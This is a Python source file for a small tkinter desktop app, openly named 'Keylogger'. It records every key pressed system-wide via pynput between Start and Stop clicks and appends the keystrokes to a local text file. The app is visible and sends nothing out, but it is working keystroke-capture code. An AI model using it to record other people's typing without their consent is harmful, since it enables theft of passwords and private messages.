import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading

class Keylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x200")
        
        self.is_running = False
        self.log = []
        
        self.label = tk.Label(root, text="Keylogger is not running", font=("Arial", 12))
        self.label.pack(pady=20)
        
        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)
        
        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)
        
        self.exit_button = tk.Button(root, text="Exit", command=self.exit_program)
        self.exit_button.pack(pady=5)
    
    def on_press(self, key):
        try:
            self.log.append(key.char)
        except AttributeError:
            self.log.append(str(key))
    
    def start_keylogger(self):
        if not self.is_running:
            self.is_running = True
            self.label.config(text="Keylogger is running")
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.start_button.config(state="disabled")
            self.stop_button.config(state="normal")
    
    def stop_keylogger(self):
        if self.is_running:
            self.is_running = False
            self.listener.stop()
            self.label.config(text="Keylogger is not running")
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            with open("keylog.txt", "a") as file:
                file.write(''.join(self.log))
            self.log.clear()
    
    def exit_program(self):
        if self.is_running:
            self.listener.stop()
        self.root.quit()

if __name__ == "__main__":
    root = tk.Tk()
    app = Keylogger(root)
    root.mainloop()
